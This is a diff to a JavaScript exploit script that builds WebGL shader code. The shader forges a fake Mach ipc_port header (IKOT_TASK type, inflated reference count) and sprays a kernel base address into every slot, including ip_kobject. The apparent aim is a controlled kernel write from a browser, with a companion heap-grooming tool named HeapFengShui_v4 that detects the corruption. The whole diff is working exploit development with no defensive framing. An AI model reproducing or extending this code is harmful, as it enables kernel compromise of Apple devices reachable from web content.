@@ -83,12 +83,29 @@
     var KERN_LO = 0x4d928000;
     var KERN_HI = 0xfffffe00;  // Note: uint32, not signed
 
+    /*
+     * v[0] encodes fake ipc_port header (first 16 bytes):
+     *   bytes  0..3  = io_bits     = 0x80000002 (IKOT_TASK | IO_BITS_ACTIVE)
+     *   bytes  4..7  = io_refs     = 0x00000064 (100 references, looks healthy)
+     *   bytes  8..11 = 0 (padding)
+     *   bytes 12..15 = 0 (padding)
+     * v[1..41] = alternating KERN_LO/KERN_HI — writes kernel_base into every
+     *   8-byte aligned slot from offset +16 onward, including ip_kobject.
+     * When mach_port_kobject() scans the corrupted port:
+     *   kotype  = io_bits & IKOT_TYPE_MASK = 2 (IKOT_TASK)  ← proves io_bits write
+     *   kobject = ip_kobject = 0xfffffe004d928000            ← proves ip_kobject write
+     * HeapFengShui_v4 detects both changes and logs CONTROLLED_WRITE_DETECTED.
+     */
+    var IO_BITS_IKOT_TASK = 2147483650;  /* 0x80000002 = IKOT_TASK | IO_BITS_ACTIVE */
+    var IO_REFS_HEALTHY   = 100;          /* 0x64 — port stays "alive" */
+
     // Build uvec4 assignments string
     var assignments = '';
     for (var vi = 0; vi < 42; vi++) {
         if (vi === 0) {
-            // First uvec4: zeros (preserve list head)
-            assignments += '    v[0] = uvec4(0u, 0u, 0u, 0u);\n';
+            // First uvec4: fake ipc_port header (IKOT_TASK, 100 refs, zeros)
+            assignments += '    v[0] = uvec4(' + IO_BITS_IKOT_TASK + 'u, ' +
+                           IO_REFS_HEALTHY + 'u, 0u, 0u);\n';
         } else {
             // Alternate KERN_LO/KERN_HI pairs: encodes 64-bit kernel_base in each pair
             assignments += '    v[' + vi + '] = uvec4(' +
@@ -251,10 +268,11 @@
         }
     }
 
-    // Start firing after 2s (let DarkSword v7 set up sockets)
+    // Start firing after 2s (let HeapFengShui_v4 set up ports)
     console.log('[v7] Starting in 2s...');
-    console.log('[v7] Shader encoding kernel_base=0xfffffe004d928000 in all varyings');
-    console.log('[v7] DarkSword v7 must be running to detect CONTROLLED_WRITE_DETECTED');
+    console.log('[v7] v[0] writes io_bits=0x80000002 (IKOT_TASK) + io_refs=100');
+    console.log('[v7] v[1..41] write kernel_base=0xfffffe004d928000 into ip_kobject');
+    console.log('[v7] HeapFengShui_v4 must be running — detects kotype+kobject change');
     setTimeout(fireRound, 2000);
 
 })();
